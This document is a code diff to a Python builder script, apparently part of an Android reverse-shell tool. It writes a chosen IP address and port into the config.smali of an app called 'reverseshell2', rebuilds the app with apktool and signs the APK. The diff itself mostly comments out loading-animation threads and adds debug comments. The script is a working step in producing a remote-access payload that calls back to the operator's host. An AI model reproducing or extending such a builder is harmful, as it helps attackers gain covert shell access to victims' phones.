@@ -1,6 +1,7 @@
 import sys
 import threading
 from colorama import Fore, Style,init
+from utils import *
 
 def animate(message):
     for c in itertools.cycle(['|', '/', '-', '\\']):
@@ -9,13 +10,20 @@ def animate(message):
         print("\r"+Style.BRIGHT+Fore.GREEN+message+c+Fore.RESET, end="")
         time.sleep(0.1)
 
-def build(direc, port, ip):
+def build(direc, port1, ip, args):
+    """ print("Datos de funcion")
+    print(direc)
+    print(port)
+    print(ip) """
     #Preparamos la ruta
     editor = "Compiled_apk_files"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
-    
-    port = str(port)
+    """ print("Se muestra editor")
+    print(editor) """
+
+    port = str(port1)
+    #print(port)
     try:
-        #se pone en modo lecutra una linea en especifico
+        #se pone en modo lectura una linea en especifico
         file = open(editor,"r").readlines()
         file[16]=file[16][:21]+"\""+ip+"\""+"\n"
         file[21]=file[21][:21]+"\""+port+"\""+"\n"
@@ -39,24 +47,24 @@ def build(direc, port, ip):
             outFileName = "test.apk"
         done=False
         # Creamos un subproceso usando hilos
-        t = threading.Thread(target=animate,args=("Building ",))
+        #t = threading.Thread(target=animate,args=("Building ",))
         #Se inicia los hilos
-        t.start()
+        #t.start()
         #se ejecuta el comando para crear la apk
         resOut = executeCMD("java -jar Jar_Files/apktool.jar b Compiled_apk_files  -o "+outFileName)
         done = True
-        t.join()
+        #t.join()
         if not resOut.returncode:
             print(Style.BRIGHT+Fore.GREEN+"\rSuccessfully apk built "+getpwd(outFileName)+"\n"+Fore.RESET,end="")
             print(Style.BRIGHT+Fore.YELLOW+"\nSigning the apk"+Fore.RESET)
             done=False
             #muestra animacion de carga mientras se ejecuta el hilo
-            t = threading.Thread(target=animate,args=("Signing ",))
-            t.start()
+            #t = threading.Thread(target=animate,args=("Signing ",))
+            #t.start()
             #Ejecutamos el comando de registro de la apk previa
             resOut = executeCMD("java -jar Jar_Files/sign.jar "+outFileName+" --override")
             done = True
-            t.join()
+            #t.join()
             #se espera un resultado del hilo
             if not resOut.returncode:
                 print(Fore.GREEN+"\rSuccessfully signed the apk "+outFileName+Fore.RESET,end="")
